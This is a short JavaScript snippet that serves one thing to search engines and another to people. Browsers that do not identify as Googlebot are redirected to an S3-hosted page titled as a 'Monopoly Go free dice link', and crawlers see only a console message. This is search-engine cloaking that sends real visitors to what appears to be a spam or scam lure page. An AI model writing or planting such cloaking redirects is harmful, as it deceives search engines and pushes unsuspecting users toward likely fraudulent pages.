// Check if the user-agent is not from a search engine crawler (e.g., Googlebot)
if (!navigator.userAgent.includes('Googlebot')) {
  // Redirect only normal users
  window.location.href = "https://s3.amazonaws.com/arena_images-temp/uploads/cf49f269-3935-4d16-a586-ce10ce90890b/monopoly-go-free-dice-link-2025";
} else {
  // For search engine crawlers, you can choose to perform a different action or not redirect
  console.log("THanks for visiting my page");
}